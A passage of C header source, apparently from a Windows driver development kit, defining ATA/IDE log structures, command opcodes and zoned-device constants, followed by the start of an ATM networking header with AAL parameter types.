    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } TimeInUnderTemperature;
  struct {
    ULONGLONG Value : 8;
    ULONGLONG Reserved : 48;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } SpecifiedMinimumOperatingTemperature;
  UCHAR Reserved[400];
} GP_LOG_TEMPERATURE_STATISTICS, *PGP_LOG_TEMPERATURE_STATISTICS;

typedef struct _GP_LOG_TRANSPORT_STATISTICS {
  DEVICE_STATISTICS_LOG_PAGE_HEADER Header;
  struct {
    ULONGLONG Count : 8;
    ULONGLONG Reserved : 48;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } NumberOfHardwareResets;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 24;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } NumberOfAsrEvents;
  struct {
    ULONGLONG Count : 32;
    ULONGLONG Reserved : 24;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } NumberOfInterfaceCrcErrors;
  UCHAR Reserved[480];
} GP_LOG_TRANSPORT_STATISTICS, *PGP_LOG_TRANSPORT_STATISTICS;

typedef struct _GP_LOG_SOLID_STATE_DEVICE_STATISTICS {
  DEVICE_STATISTICS_LOG_PAGE_HEADER Header;
  struct {
    ULONGLONG Value : 8;
    ULONGLONG Reserved : 48;
    ULONGLONG ReservedFlags : 3;
    ULONGLONG MonitoredConditionMet : 1;
    ULONGLONG StatisticsSupportsDsn : 1;
    ULONGLONG Normalized : 1;
    ULONGLONG ValidValue : 1;
    ULONGLONG Supported : 1;
  } PercentageUsedEnduranceIndicator;
  UCHAR Reserved[496];
} GP_LOG_SOLID_STATE_DEVICE_STATISTICS, *PGP_LOG_SOLID_STATE_DEVICE_STATISTICS;

typedef struct _GP_LOG_NCQ_COMMAND_ERROR {
  UCHAR NcqTag : 5;
  UCHAR Reserved0 : 1;
  UCHAR UNL : 1;
  UCHAR NonQueuedCmd : 1;
  UCHAR Reserved1;
  UCHAR Status;
  UCHAR Error;
  UCHAR LBA7_0;
  UCHAR LBA15_8;
  UCHAR LBA23_16;
  UCHAR Device;
  UCHAR LBA31_24;
  UCHAR LBA39_32;
  UCHAR LBA47_40;
  UCHAR Reserved2;
  UCHAR Count7_0;
  UCHAR Count15_8;
  UCHAR SenseKey;
  UCHAR ASC;
  UCHAR ASCQ;
  UCHAR Reserved3[239];
  UCHAR Vendor[255];
  UCHAR Checksum;
} GP_LOG_NCQ_COMMAND_ERROR, *PGP_LOG_NCQ_COMMAND_ERROR;

typedef struct _GP_LOG_NCQ_NON_DATA {
  struct {
    ULONG AbortNcq : 1;
    ULONG AbortAll : 1;
    ULONG AbortStreaming : 1;
    ULONG AbortNonStreaming : 1;
    ULONG AbortSelectedTTag : 1;
    ULONG Reserved : 27;
  } SubCmd0;
  struct {
    ULONG DeadlineHandling : 1;
    ULONG WriteDataNotContinue : 1;
    ULONG ReadDataNotContinue : 1;
    ULONG Reserved : 29;
  } SubCmd1;
  struct {
    ULONG HybridDemoteBySize : 1;
    ULONG Reserved : 31;
  } SubCmd2;
  struct {
    ULONG HybridChangeByLbaRange : 1;
    ULONG Reserved : 31;
  } SubCmd3;
  struct {
    ULONG HybridControl : 1;
    ULONG Reserved : 31;
  } SubCmd4;
  struct {
    ULONG Reserved : 32;
  } SubCmd5;
  struct {
    ULONG Reserved : 32;
  } SubCmd6;
  struct {
    ULONG Reserved : 32;
  } SubCmd7;
  struct {
    ULONG Reserved : 32;
  } SubCmd8;
  struct {
    ULONG Reserved : 32;
  } SubCmd9;
  struct {
    ULONG Reserved : 32;
  } SubCmdA;
  struct {
    ULONG Reserved : 32;
  } SubCmdB;
  struct {
    ULONG Reserved : 32;
  } SubCmdC;
  struct {
    ULONG Reserved : 32;
  } SubCmdD;
  struct {
    ULONG Reserved : 32;
  } SubCmdE;
  struct {
    ULONG Reserved : 32;
  } SubCmdF;
  ULONG Reserved[112];
} GP_LOG_NCQ_NON_DATA, *PGP_LOG_NCQ_NON_DATA;

typedef struct _GP_LOG_NCQ_SEND_RECEIVE {
  struct {
    ULONG DataSetManagement : 1;
    ULONG HybridEvict : 1;
    ULONG Reserved : 30;
  } SubCmd;
  struct {
    ULONG Trim : 1;
    ULONG Reserved : 31;
  } DataSetManagement;
  ULONG Reserved[126];
} GP_LOG_NCQ_SEND_RECEIVE, *PGP_LOG_NCQ_SEND_RECEIVE;

typedef struct _GP_LOG_HYBRID_INFORMATION_HEADER {
  USHORT HybridInfoDescrCount : 4;
  USHORT Reserved0 : 12;
  UCHAR Enabled;
  UCHAR HybridHealth;
  UCHAR DirtyLowThreshold;
  UCHAR DirtyHighThreshold;
  UCHAR OptimalWriteGranularity;
  UCHAR MaximumHybridPriorityLevel : 4;
  UCHAR Reserved1 : 4;
  UCHAR PowerCondidtion;
  UCHAR CachingMediumEnabled ;
  struct {
    UCHAR MaximumPriorityBehavior : 1;
    UCHAR SupportCacheBehavior : 1;
    UCHAR Reserved : 6;
  } SupportedOptions;
  UCHAR Reserved2;
  ULONG TimeSinceEnabled;
  ULONGLONG NVMSize;
  ULONGLONG EnableCount;
  USHORT MaximumEvictionCommands : 5;
  USHORT Reserved3 : 11;
  USHORT MaximumEvictionDataBlocks;
  UCHAR Reserved[28];
} GP_LOG_HYBRID_INFORMATION_HEADER, *PGP_LOG_HYBRID_INFORMATION_HEADER;

typedef struct _GP_LOG_HYBRID_INFORMATION_DESCRIPTOR {
  UCHAR HybridPriority;
  UCHAR ConsumedNVMSizeFraction;
  UCHAR ConsumedMappingResourcesFraction;
  UCHAR ConsumedNVMSizeForDirtyDataFraction;
  UCHAR ConsumedMappingResourcesForDirtyDataFraction;
  UCHAR Reserved[11];
} GP_LOG_HYBRID_INFORMATION_DESCRIPTOR, *PGP_LOG_HYBRID_INFORMATION_DESCRIPTOR;

typedef struct _GP_LOG_HYBRID_INFORMATION {
  GP_LOG_HYBRID_INFORMATION_HEADER Header;
  GP_LOG_HYBRID_INFORMATION_DESCRIPTOR Descriptor[0];
} GP_LOG_HYBRID_INFORMATION, *PGP_LOG_HYBRID_INFORMATION;

typedef struct _REPORT_ZONES_EXT_DATA {
  ULONG ZoneListLength;
  UCHAR SAME : 4;
  UCHAR Reserved0 : 4;
  UCHAR Reserved1[3];
  ULONGLONG MaxLBA : 48;
  ULONGLONG Reserved2 : 16;
  UCHAR Reserved3[48];
} REPORT_ZONES_EXT_DATA, *PREPORT_ZONES_EXT_DATA;

typedef struct _ATA_ZONE_DESCRIPTOR {
  UCHAR ZoneType : 4;
  UCHAR Reserved0 : 4;
  UCHAR Reset : 1;
  UCHAR NonSeq : 1;
  UCHAR Reserved1 : 2;
  UCHAR ZoneCondition : 4;
  UCHAR Reserved2[6];
  ULONGLONG ZoneLength : 48;
  ULONGLONG Reserved3 : 16;
  ULONGLONG ZoneStartLBA : 48;
  ULONGLONG Reserved4 : 16;
  ULONGLONG WritePointerLBA : 48;
  ULONGLONG Reserved5 : 16;
  UCHAR Reserved6[32];
} ATA_ZONE_DESCRIPTOR, *PATA_ZONE_DESCRIPTOR;

typedef struct _ATA_PHYSICAL_ELEMENT_STATUS_DESCRIPTOR {
  UCHAR Reserved1[4];
  ULONG ElementIdentifier;
  UCHAR Reserved2[6];
  UCHAR PhysicalElementType;
  UCHAR PhysicalElementHealth;
  ULONGLONG AssociatedCapacity;
  UCHAR Reserved3[8];
} ATA_PHYSICAL_ELEMENT_STATUS_DESCRIPTOR, *PATA_PHYSICAL_ELEMENT_STATUS_DESCRIPTOR;

typedef struct _ATA_GET_PHYSICAL_ELEMENT_STATUS_PARAMETER_DATA {
  ULONG NumberOfDescriptors;
  ULONG NumberOfDescriptorsReturned;
  ULONG ElementIdentifierBeingDepoped;
  UCHAR Reserved[20];
  ATA_PHYSICAL_ELEMENT_STATUS_DESCRIPTOR Descriptors[ANYSIZE_ARRAY];
} ATA_GET_PHYSICAL_ELEMENT_STATUS_PARAMETER_DATA, *PATA_GET_PHYSICAL_ELEMENT_STATUS_PARAMETER_DATA;

#pragma pack(pop)

#define ATAPI_MODE_SENSE        0x5A
#define ATAPI_MODE_SELECT       0x55
#define ATAPI_LS120_FORMAT_UNIT 0x24

#define IDE_LBA_MODE   (1 << 6)

#define IDE_DC_DISABLE_INTERRUPTS    0x02
#define IDE_DC_RESET_CONTROLLER      0x04
#define IDE_DC_REENABLE_CONTROLLER   0x00

#define IDE_STATUS_ERROR             0x01
#define IDE_STATUS_INDEX             0x02
#define IDE_STATUS_CORRECTED_ERROR   0x04
#define IDE_STATUS_DRQ               0x08
#define IDE_STATUS_DSC               0x10
#define IDE_STATUS_DEVICE_FAULT      0x20
#define IDE_STATUS_DRDY              0x40
#define IDE_STATUS_IDLE              0x50
#define IDE_STATUS_BUSY              0x80

#define IDE_ERROR_BAD_BLOCK          0x80
#define IDE_ERROR_CRC_ERROR          IDE_ERROR_BAD_BLOCK
#define IDE_ERROR_DATA_ERROR         0x40
#define IDE_ERROR_MEDIA_CHANGE       0x20
#define IDE_ERROR_ID_NOT_FOUND       0x10
#define IDE_ERROR_MEDIA_CHANGE_REQ   0x08
#define IDE_ERROR_COMMAND_ABORTED    0x04
#define IDE_ERROR_END_OF_MEDIA       0x02
#define IDE_ERROR_ILLEGAL_LENGTH     0x01
#define IDE_ERROR_ADDRESS_NOT_FOUND  IDE_ERROR_ILLEGAL_LENGTH

#define IDE_COMMAND_NOP                         0x00
#define IDE_COMMAND_DATA_SET_MANAGEMENT         0x06
#define IDE_COMMAND_ATAPI_RESET                 0x08
#define IDE_COMMAND_GET_PHYSICAL_ELEMENT_STATUS 0x12
#define IDE_COMMAND_READ                        0x20
#define IDE_COMMAND_READ_EXT                    0x24
#define IDE_COMMAND_READ_DMA_EXT                0x25
#define IDE_COMMAND_READ_DMA_QUEUED_EXT         0x26
#define IDE_COMMAND_READ_MULTIPLE_EXT           0x29
#define IDE_COMMAND_READ_LOG_EXT                0x2f
#define IDE_COMMAND_WRITE                       0x30
#define IDE_COMMAND_WRITE_EXT                   0x34
#define IDE_COMMAND_WRITE_DMA_EXT               0x35
#define IDE_COMMAND_WRITE_DMA_QUEUED_EXT        0x36
#define IDE_COMMAND_WRITE_MULTIPLE_EXT          0x39
#define IDE_COMMAND_WRITE_DMA_FUA_EXT           0x3D
#define IDE_COMMAND_WRITE_DMA_QUEUED_FUA_EXT    0x3E
#define IDE_COMMAND_WRITE_LOG_EXT               0x3F
#define IDE_COMMAND_VERIFY                      0x40
#define IDE_COMMAND_VERIFY_EXT                  0x42
#define IDE_COMMAND_ZAC_MANAGEMENT_IN           0x4A
#define IDE_COMMAND_WRITE_LOG_DMA_EXT           0x57
#define IDE_COMMAND_TRUSTED_NON_DATA            0x5B
#define IDE_COMMAND_TRUSTED_RECEIVE             0x5C
#define IDE_COMMAND_TRUSTED_RECEIVE_DMA         0x5D
#define IDE_COMMAND_TRUSTED_SEND                0x5E
#define IDE_COMMAND_TRUSTED_SEND_DMA            0x5F
#define IDE_COMMAND_READ_FPDMA_QUEUED           0x60
#define IDE_COMMAND_WRITE_FPDMA_QUEUED          0x61
#define IDE_COMMAND_NCQ_NON_DATA                0x63
#define IDE_COMMAND_SEND_FPDMA_QUEUED           0x64
#define IDE_COMMAND_RECEIVE_FPDMA_QUEUED        0x65
#define IDE_COMMAND_SET_DATE_AND_TIME           0x77
#define IDE_COMMAND_REMOVE_ELEMENT_AND_TRUNCATE 0x7C
#define IDE_COMMAND_EXECUTE_DEVICE_DIAGNOSTIC   0x90
#define IDE_COMMAND_SET_DRIVE_PARAMETERS        0x91
#define IDE_COMMAND_DOWNLOAD_MICROCODE          0x92
#define IDE_COMMAND_DOWNLOAD_MICROCODE_DMA      0x93
#define IDE_COMMAND_ZAC_MANAGEMENT_OUT          0x9F
#define IDE_COMMAND_ATAPI_PACKET                0xA0
#define IDE_COMMAND_ATAPI_IDENTIFY              0xA1
#define IDE_COMMAND_SMART                       0xB0
#define IDE_COMMAND_READ_LOG_DMA_EXT            0xB1
#define IDE_COMMAND_SANITIZE_DEVICE             0xB4
#define IDE_COMMAND_READ_MULTIPLE               0xC4
#define IDE_COMMAND_WRITE_MULTIPLE              0xC5
#define IDE_COMMAND_SET_MULTIPLE                0xC6
#define IDE_COMMAND_READ_DMA                    0xC8
#define IDE_COMMAND_WRITE_DMA                   0xCA
#define IDE_COMMAND_WRITE_DMA_QUEUED            0xCC
#define IDE_COMMAND_WRITE_MULTIPLE_FUA_EXT      0xCE
#define IDE_COMMAND_GET_MEDIA_STATUS            0xDA
#define IDE_COMMAND_DOOR_LOCK                   0xDE
#define IDE_COMMAND_DOOR_UNLOCK                 0xDF
#define IDE_COMMAND_STANDBY_IMMEDIATE           0xE0
#define IDE_COMMAND_IDLE_IMMEDIATE              0xE1
#define IDE_COMMAND_CHECK_POWER                 0xE5
#define IDE_COMMAND_SLEEP                       0xE6
#define IDE_COMMAND_FLUSH_CACHE                 0xE7
#define IDE_COMMAND_FLUSH_CACHE_EXT             0xEA
#define IDE_COMMAND_IDENTIFY                    0xEC
#define IDE_COMMAND_MEDIA_EJECT                 0xED
#define IDE_COMMAND_SET_FEATURE                 0xEF
#define IDE_COMMAND_SECURITY_SET_PASSWORD       0xF1
#define IDE_COMMAND_SECURITY_UNLOCK             0xF2
#define IDE_COMMAND_SECURITY_ERASE_PREPARE      0xF3
#define IDE_COMMAND_SECURITY_ERASE_UNIT         0xF4
#define IDE_COMMAND_SECURITY_FREEZE_LOCK        0xF5
#define IDE_COMMAND_SECURITY_DISABLE_PASSWORD   0xF6
#define IDE_COMMAND_NOT_VALID                   0xFF

#define IDE_SET_DEFAULT_PIO_MODE(mode)      ((UCHAR)1)
#define IDE_SET_ADVANCE_PIO_MODE(mode)      ((UCHAR)((1 << 3) | (mode)))
#define IDE_SET_SWDMA_MODE(mode)            ((UCHAR)((1 << 4) | (mode)))
#define IDE_SET_MWDMA_MODE(mode)            ((UCHAR)((1 << 5) | (mode)))
#define IDE_SET_UDMA_MODE(mode)             ((UCHAR)((1 << 6) | (mode)))

#define IDE_FEATURE_ENABLE_WRITE_CACHE          0x2
#define IDE_FEATURE_SET_TRANSFER_MODE           0x3
#define IDE_FEATURE_ENABLE_PUIS                 0x6
#define IDE_FEATURE_PUIS_SPIN_UP                0x7
#define IDE_FEATURE_ENABLE_SATA_FEATURE         0x10
#define IDE_FEATURE_DISABLE_MSN                 0x31
#define IDE_FEATURE_DISABLE_REVERT_TO_POWER_ON  0x66
#define IDE_FEATURE_DISABLE_WRITE_CACHE         0x82
#define IDE_FEATURE_DISABLE_PUIS                0x86
#define IDE_FEATURE_DISABLE_SATA_FEATURE        0x90
#define IDE_FEATURE_ENABLE_MSN                  0x95

#define IDE_SATA_FEATURE_NON_ZERO_DMA_BUFFER_OFFSET         0x1
#define IDE_SATA_FEATURE_DMA_SETUP_FIS_AUTO_ACTIVATE        0x2
#define IDE_SATA_FEATURE_DEVICE_INITIATED_POWER_MANAGEMENT  0x3
#define IDE_SATA_FEATURE_GUARANTEED_IN_ORDER_DELIVERY       0x4
#define IDE_SATA_FEATURE_ASYNCHRONOUS_NOTIFICATION          0x5
#define IDE_SATA_FEATURE_SOFTWARE_SETTINGS_PRESERVATION     0x6
#define IDE_SATA_FEATURE_DEVICE_AUTO_PARTIAL_TO_SLUMBER     0x7
#define IDE_SATA_FEATURE_ENABLE_HARDWARE_FEATURE_CONTROL    0x8
#define IDE_SATA_FEATURE_DEVSLP                             0x9
#define IDE_SATA_FEATURE_HYBRID_INFORMATION                 0xA

#define IDE_SMART_READ_ATTRIBUTES               0xD0
#define IDE_SMART_READ_THRESHOLDS               0xD1
#define IDE_SMART_ENABLE_DISABLE_AUTOSAVE       0xD2
#define IDE_SMART_SAVE_ATTRIBUTE_VALUES         0xD3
#define IDE_SMART_EXECUTE_OFFLINE_DIAGS         0xD4
#define IDE_SMART_READ_LOG                      0xD5
#define IDE_SMART_WRITE_LOG                     0xD6
#define IDE_SMART_ENABLE                        0xD8
#define IDE_SMART_DISABLE                       0xD9
#define IDE_SMART_RETURN_STATUS                 0xDA
#define IDE_SMART_ENABLE_DISABLE_AUTO_OFFLINE   0xDB

#define IDE_DSM_FEATURE_TRIM                  0x0001

#define IDE_NCQ_NON_DATA_ABORT_NCQ_QUEUE                0x00
#define IDE_NCQ_NON_DATA_DEADLINE_HANDLING              0x01
#define IDE_NCQ_NON_DATA_HYBRID_CHANGE_BY_SIZE          0x02
#define IDE_NCQ_NON_DATA_HYBRID_DEMOTE_BY_SIZE          0x02
#define IDE_NCQ_NON_DATA_HYBRID_CHANGE_BY_LBA_RANGE     0x03
#define IDE_NCQ_NON_DATA_HYBRID_CONTROL                 0x04

#define IDE_NCQ_SEND_DATA_SET_MANAGEMENT                0x00
#define IDE_NCQ_SEND_HYBRID_EVICT                       0x01

#define ATA_DEVICE_SET_PASSWORD_MASTER       0x01
#define ATA_DEVICE_SET_PASSWORD_USER         0x00

#define IDE_GP_LOG_DIRECTORY_ADDRESS                0x00
#define IDE_GP_SUMMARY_SMART_ERROR                  0x01
#define IDE_GP_COMPREHENSIVE_SMART_ERROR            0x02
#define IDE_GP_EXTENDED_COMPREHENSIVE_SMART_ERROR   0x03
#define IDE_GP_LOG_DEVICE_STATISTICS_ADDRESS        0x04
#define IDE_GP_SMART_SELF_TEST                      0x06
#define IDE_GP_EXTENDED_SMART_SELF_TEST             0x07
#define IDE_GP_LOG_POWER_CONDITIONS                 0x08
#define IDE_GP_SELECTIVE_SELF_TEST                  0x09
#define IDE_GP_DEVICE_STATISTICS_NOTIFICATION       0x0A
#define IDE_GP_PENDING_DEFECTS                      0x0C
#define IDE_GP_LPS_MISALIGNMENT                     0x0D
#define IDE_GP_LOG_NCQ_COMMAND_ERROR_ADDRESS        0x10
#define IDE_GP_LOG_PHY_EVENT_COUNTER_ADDRESS        0x11
#define IDE_GP_LOG_NCQ_NON_DATA_ADDRESS             0x12
#define IDE_GP_LOG_NCQ_SEND_RECEIVE_ADDRESS         0x13
#define IDE_GP_LOG_HYBRID_INFO_ADDRESS              0x14
#define IDE_GP_LOG_REBUILD_ASSIST                   0x15
#define IDE_GP_LOG_LBA_STATUS                       0x19
#define IDE_GP_LOG_WRITE_STREAM_ERROR               0x21
#define IDE_GP_LOG_READ_STREAM_ERROR                0x22
#define IDE_GP_LOG_CURRENT_DEVICE_INTERNAL_STATUS   0x24
#define IDE_GP_LOG_SAVED_DEVICE_INTERNAL_STATUS     0x25
#define IDE_GP_LOG_IDENTIFY_DEVICE_DATA_ADDRESS     0x30
#define IDE_GP_LOG_SCT_COMMAND_STATUS               0xE0
#define IDE_GP_LOG_SCT_DATA_TRANSFER                0xE1

#define IDE_GP_LOG_SECTOR_SIZE                      0x200

#define IDE_GP_LOG_VERSION                          0x0001

#define IDE_GP_LOG_SUPPORTED_PAGES                  0x00

#define IDE_GP_LOG_IDENTIFY_DEVICE_DATA_SUPPORTED_CAPABILITIES_PAGE     0x03
#define IDE_GP_LOG_IDENTIFY_DEVICE_DATA_SATA_PAGE                       0x08
#define IDE_GP_LOG_IDENTIFY_DEVICE_DATA_ZONED_DEVICE_INFORMATION_PAGE   0x09

#define ATA_ZONED_CAPABILITIES_NOT_REPORTED       0x0
#define ATA_ZONED_CAPABILITIES_HOST_AWARE         0x1
#define ATA_ZONED_CAPABILITIES_DEVICE_MANAGED     0x2

#define ZAC_REVISION_NOT_REPORTED_1     0x0000
#define ZAC_REVISION_NOT_REPORTED_2     0xFFFF
#define ZAC_REVISION_01                 0xB6E8
#define ZAC_REVISION_04                 0xA36C

#define CURRENT_DEVICE_INTERNAL_STATUS_DATA_LOG_ADDRESS     0x24
#define SAVED_DEVICE_INTERNAL_STATUS_DATA_LOG_ADDRESS       0x25

#define IDE_GP_LOG_DEVICE_STATISTICS_GENERAL_PAGE           0x01
#define IDE_GP_LOG_DEVICE_STATISTICS_FREE_FALL_PAGE         0x02
#define IDE_GP_LOG_DEVICE_STATISTICS_ROTATING_MEDIA_PAGE    0x03
#define IDE_GP_LOG_DEVICE_STATISTICS_GENERAL_ERROR_PAGE     0x04
#define IDE_GP_LOG_DEVICE_STATISTICS_TEMPERATURE_PAGE       0x05
#define IDE_GP_LOG_DEVICE_STATISTICS_TRANSPORT_PAGE         0x06
#define IDE_GP_LOG_DEVICE_STATISTICS_SSD_PAGE               0x07

#define HYBRID_INFORMATION_DISABLED             0x00
#define HYBRID_INFORMATION_DISABLE_IN_PROCESS   0x80
#define HYBRID_INFORMATION_ENABLED              0xFF

#define HYBRID_HEALTH_UNUSEABLE                 0x01
#define HYBRID_HEALTH_NVM_SIZE_CHANGED          0x02
#define HYBRID_HEALTH_READ_ONLY                 0x04
#define HYBRID_HEALTH_DATA_LOSS                 0x08

#define ATA_DEVICE_SIGNATURE_ATA                0x00000101
#define ATA_DEVICE_SIGNATURE_ATAPI              0xEB140101
#define ATA_DEVICE_SIGNATURE_HOST_ZONED         0xABCD0101
#define ATA_DEVICE_SIGNATURE_ENCLOSURE          0xC33C0101
#define ATA_DEVICE_SIGNATURE_PORT_MULTIPLIER    0x96690101

#define ZM_ACTION_REPORT_ZONES          0x00
#define ZM_ACTION_CLOSE_ZONE            0x01
#define ZM_ACTION_FINISH_ZONE           0x02
#define ZM_ACTION_OPEN_ZONE             0x03
#define ZM_ACTION_RESET_WRITE_POINTER   0x04

#define ZM_ALL_ZONES_BIT                (1 << 8)

#define ATA_REPORT_ZONES_OPTION_LIST_ALL_ZONES                  0x00
#define ATA_REPORT_ZONES_OPTION_LIST_EMPTY_ZONES                0x01
#define ATA_REPORT_ZONES_OPTION_LIST_IMPLICITLY_OPENED_ZONES    0x02
#define ATA_REPORT_ZONES_OPTION_LIST_EXPLICITLY_OPENED_ZONES    0x03
#define ATA_REPORT_ZONES_OPTION_LIST_CLOSED_ZONES               0x04
#define ATA_REPORT_ZONES_OPTION_LIST_FULL_ZONES                 0x05
#define ATA_REPORT_ZONES_OPTION_LIST_READ_ONLY_ZONES            0x06
#define ATA_REPORT_ZONES_OPTION_LIST_OFFLINE_ZONES              0x07

#define ATA_REPORT_ZONES_OPTION_LIST_RWP_ZONES                                      0x10
#define ATA_REPORT_ZONES_OPTION_LIST_NON_SEQUENTIAL_WRITE_RESOURCES_ACTIVE_ZONES    0x11

#define ATA_REPORT_ZONES_OPTION_LIST_NOT_WRITE_POINTER_ZONES    0x3F

#define ATA_ZONES_TYPE_AND_LENGTH_MAY_DIFFERENT          0x0
#define ATA_ZONES_TYPE_SAME_LENGTH_SAME                  0x1
#define ATA_ZONES_TYPE_SAME_LAST_ZONE_LENGTH_DIFFERENT   0x2
#define ATA_ZONES_TYPE_MAY_DIFFERENT_LENGTH_SAME         0x3

#define ATA_ZONE_TYPE_CONVENTIONAL                          0x1
#define ATA_ZONE_TYPE_SEQUENTIAL_WRITE_REQUIRED             0x2
#define ATA_ZONE_TYPE_SEQUENTIAL_WRITE_PREFERRED            0x3

#define ATA_ZONE_CONDITION_NOT_WRITE_POINTER                0x0
#define ATA_ZONE_CONDITION_EMPTY                            0x1
#define ATA_ZONE_CONDITION_IMPLICITLY_OPENED                0x2
#define ATA_ZONE_CONDITION_EXPLICITLY_OPENED                0x3
#define ATA_ZONE_CONDITION_CLOSED                           0x4
#define ATA_ZONE_CONDITION_READ_ONLY                        0xD
#define ATA_ZONE_CONDITION_FULL                             0xE
#define ATA_ZONE_CONDITION_OFFLINE                          0xF

#endif

```

`include/ddk/atm.h`:

```h
/*
 * atm.h
 *
 * ATM support
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#pragma once

#ifdef __cplusplus
extern "C" {
#endif

typedef ULONG ATM_ADDRESSTYPE;

#define SAP_TYPE_NSAP                  1
#define SAP_TYPE_E164                  2

#define ATM_MEDIA_SPECIFIC             1

#define CALLMGR_SPECIFIC_Q2931         1

#define ATM_NSAP                       0
#define ATM_E164                       1

#define ATM_MAC_ADDRESS_LENGTH         6
#define ATM_ADDRESS_LENGTH             20

typedef ULONG ATM_AAL_TYPE, *PATM_AAL_TYPE;

#define AAL_TYPE_AAL0                  1
#define AAL_TYPE_AAL1                  2
#define AAL_TYPE_AAL34                 4
#define AAL_TYPE_AAL5                  8

#define ATM_ADDR_BLANK_CHAR            L' '
#define ATM_ADDR_E164_START_CHAR       L'+'
#define ATM_ADDR_PUNCTUATION_CHAR      L'.'

typedef enum _Q2931_IE_TYPE {
  IE_AALParameters,
  IE_TrafficDescriptor,
  IE_BroadbandBearerCapability,
  IE_BHLI,
  IE_BLLI,
  IE_CalledPartyNumber,
  IE_CalledPartySubaddress,
  IE_CallingPartyNumber,
  IE_CallingPartySubaddress,
  IE_Cause,
  IE_QOSClass,
  IE_TransitNetworkSelection,
  IE_BroadbandSendingComplete,
  IE_LIJCallId,
  IE_Raw
} Q2931_IE_TYPE;

typedef struct _Q2931_IE {
  Q2931_IE_TYPE IEType;
  ULONG IELength;
  UCHAR IE[1];
} Q2931_IE, *PQ2931_IE;

typedef struct _AAL1_PARAMETERS {
  UCHAR Subtype;
  UCHAR CBRRate;
  USHORT Multiplier;
  UCHAR SourceClockRecoveryMethod;
  UCHAR ErrorCorrectionMethod;
  USHORT StructuredDataTransferBlocksize;
  UCHAR PartiallyFilledCellsMethod;
} AAL1_PARAMETERS, *PAAL1_PARAMETERS;

typedef struct _AAL34_PARAMETERS {
  USHORT ForwardMaxCPCSSDUSize;
  USHORT BackwardMaxCPCSSDUSize;
  USHORT LowestMID;
  USHORT HighestMID;
  UCHAR SSCSType;
} AAL34_PARAMETERS, *PAAL34_PARAMETERS;

/* AAL5_PARAMETERS.Mode constants */
#define AAL5_MODE_MESSAGE              0x01
#define AAL5_MODE_STREAMING            0x02

/* AAL5_PARAMETERS.SSCSType constants */
#define AAL5_SSCS_NULL                 0x00
#define AAL5_SSCS_SSCOP_ASSURED        0x01
#define AAL5_SSCS_SSCOP_NON_ASSURED    0x02
#define AAL5_SSCS_FRAME_RELAY          0x04

typedef struct _AAL5_PARAMETERS {
  ULONG ForwardMaxCPCSSDUSize;
  ULONG BackwardMaxCPCSSDUSize;
  UCHAR Mode;
  UCHAR SSCSType;
} AAL5_PARAMETERS, *PAAL5_PARAMETERS;

typedef struct _AALUSER_PARAMETERS {
  ULONG UserDefined;
} AALUSER_PARAMETERS, *PAALUSER_PARAMETERS;

typedef struct _AAL_PARAMETERS_IE {
  ATM_AAL_TYPE AALType;
  union {
    AAL1_PARAMETERS AAL1Parameters;
    AAL34_PARAMETERS AAL34Parameters;
    AAL5_PARAMETERS AAL5Parameters;
    AALUSER_PARAMETERS AALUserParameters;
  } AALSpecificParameters;
} AAL_PARAMETERS_IE, *PAAL_PARAMETERS_IE;

struct _ATM_AAL5_INFO {
  BOOLEAN CellLossPriority;
  UCHAR UserToUserIndication;
  UCHAR CommonPartIndicator;
};

struct _ATM_AAL0_INFO {
  BOOLEAN CellLossPriority;
  UCHAR PayLoadTypeIdentifier;
};

typedef struct _ATM_AAL_OOB_INFO {
  ATM_AAL_TYPE AalType;
  union {
    struct _ATM_AAL5_INFO ATM_AAL5_INFO;
    struct _ATM_AAL0_INFO ATM_AAL0_INFO;
  };
} ATM_AAL_OOB_INFO, *PATM_AAL_OOB_INFO;

typedef struct _ATM_ADDRESS {
  ATM_ADDRESSTYPE AddressType;
  ULONG NumberOfDigits;
  UCHAR Address[ATM_ADDRESS_LENGTH];
} ATM_ADDRESS, *PATM_ADDRESS;

#define ATM_PHYS_RATE_SONET_STS3C      155520000
#define ATM_PHYS_RATE_IBM_25           25600000

#define ATM_CELL_TRANSFER_CAPACITY_SONET_STS3C   149760000
#define ATM_CELL_TRANSFER_CAPACITY_IBM_25        25125926

#define ATM_USER_DATA_RATE_SONET_155   1356317
#define ATM_USER_DATA_RATE_IBM_25      227556

/* ATM_BHLI_IE.HighLayerInfoType constants */
#define BHLI_ISO                       0x00
#define BHLI_UserSpecific              0x01
#define BHLI_HighLayerProfile          0x02
#define BHLI_VendorSpecificAppId       0x03

typedef struct _ATM_BHLI_IE {
  ULONG HighLayerInfoType;
  ULONG HighLayerInfoLength;
  UCHAR HighLayerInfo[8];
} ATM_BHLI_IE, *PATM_BHLI_IE;

/* ATM_BLLI_IE.Layer2Protocol constants */
#define BLLI_L2_ISO_1745               0x01
#define BLLI_L2_Q921                   0x02
#define BLLI_L2_X25L                   0x06
#define BLLI_L2_X25M                   0x07
#define BLLI_L2_ELAPB                  0x08
#define BLLI_L2_HDLC_ARM               0x09
#define BLLI_L2_HDLC_NRM               0x0A
